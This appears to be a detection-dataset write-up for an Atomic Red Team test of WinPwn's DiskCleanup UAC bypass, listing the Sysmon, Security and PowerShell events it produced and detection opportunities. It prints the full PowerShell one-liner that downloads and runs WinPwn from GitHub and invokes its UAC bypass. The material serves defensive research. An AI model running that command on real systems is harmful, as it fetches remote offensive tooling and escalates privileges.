# T1548.002-20: Bypass User Account Control — WinPwn UAC Bypass DiskCleanup Technique

## Technique Context

This test uses WinPwn's `DiskCleanup` UAC bypass technique. Like Method 33 (UACME), this
targets the `SilentCleanup` scheduled task — but via a different implementation. WinPwn's
DiskCleanup technique manipulates the `%windir%` environment variable to point to an
attacker-controlled path before triggering `SilentCleanup`, causing it to execute a payload
with high integrity. The test command line is:
`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
`UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique DiskCleanup`

The GitHub commit hash in the URL is pinned, ensuring a specific WinPwn version is used.

## What This Dataset Contains

**Sysmon (30 events):** EIDs 7 (ImageLoad, 17), 1 (ProcessCreate, 3), 10 (ProcessAccess, 3),
3 (NetworkConnect, 3), 17 (PipeCreate, 2), 22 (DnsQuery, 1), 11 (FileCreate, 1).

Key process-create events (EID 1):
- `whoami.exe` — ART pre-check
- WinPwn child `powershell.exe`:
  `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
  `UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique DiskCleanup}`
  `SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8`
  (parent: ART test framework `powershell.exe`)
- Second `whoami.exe` — ART post-check

EID 22 (DnsQuery, 1): DNS resolution for `raw.githubusercontent.com` resolving to
`::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133`
from the WinPwn `powershell.exe` — the GitHub CDN DNS lookup for the script download.

EID 3 (NetworkConnect, 3): Three TCP connections from the WinPwn `powershell.exe` to
`185.199.109.133:443` (GitHub CDN), tagged `technique_id=T1059.001`.

EID 11 (FileCreate, 1): `powershell.exe` writing
`C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive` — ambient PowerShell profile artifact.

**Security (3 events):** Three EID 4688 events: `whoami.exe` (pre-check), WinPwn
`powershell.exe` with the DiskCleanup command line, and `whoami.exe` (post-check).
All `TokenElevationTypeDefault (1)` and `MandatoryLabel: S-1-16-16384`.

**PowerShell (112 events):** EIDs 4104 (109), 4103 (2), 4100 (1). Identical pattern to
test 18 (magic technique). The 4100 error event and dual 4103 entries indicate a PowerShell
pipeline error during execution, consistent with the DiskCleanup technique failing to spawn
an elevated payload (the `%windir%` manipulation may not have been observable or effective
when running as SYSTEM).

## What This Dataset Does Not Contain

**No SilentCleanup task execution.** The DiskCleanup/SilentCleanup bypass should produce
`taskhostw.exe` or `cleanmgr.exe` process create events rooted in the task scheduler service.
These are absent, confirming the bypass did not successfully trigger the scheduled task execution
path in this test run.

**No environment variable modification artifacts.** The `%windir%` manipulation that is
central to both UACME Method 33 and WinPwn's DiskCleanup technique is not capturable by
any of the three logging channels.

**No cmd.exe elevated payload.** The intended spawned payload (`cmd.exe`) does not appear
as a child of any scheduled task or SilentCleanup-related process.

## Assessment

This dataset is closely comparable to test 18 (WinPwn magic): both download from the same
pinned GitHub commit, use the same WinPwn `powershell.exe` child binary (identical SHA256),
and produce similar event counts (30 vs. 31 Sysmon, 3 vs. 4 Security, 112 vs. 112 PowerShell).
The primary difference is the `-technique DiskCleanup` argument and the appearance of an EID
22 DNS query event here (which test 18 lacks in its samples — likely a cache hit for test 18).
The DiskCleanup technique targets the same `SilentCleanup` scheduled task path as UACME
Method 33, making these two tests complementary in terms of the target mechanism.

Compared to the defended run (47 Sysmon / 10 Security / 51 PowerShell), the undefended run
shows significantly fewer Sysmon events (30 vs. 47) and the same Security events (3 vs. 10
with Defender overhead). The defended run's 47 Sysmon events reflected Defender's own process
inspection generating additional EID 7 and EID 10 events.

## Detection Opportunities Present in This Data

- **Security EID 4688 / Sysmon EID 1:** `powershell.exe` command line containing
  `WinPwn.ps1` URL + `UACBypass -technique DiskCleanup`.
- **Sysmon EID 22 + EID 3:** DNS query for `raw.githubusercontent.com` resolved to
  `185.199.109.133` immediately followed by HTTPS connections — live payload download pattern.
- **Process hash:** `SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8`
  for the WinPwn `powershell.exe` child (shared with tests 18, 19, 21).
- **Technique correlation:** The DiskCleanup and UACME Method 33 techniques share the same
  target (SilentCleanup scheduled task). Monitoring for `%windir%` environment variable
  changes at the process level, combined with subsequent `SilentCleanup` task invocations,
  would detect both variants.
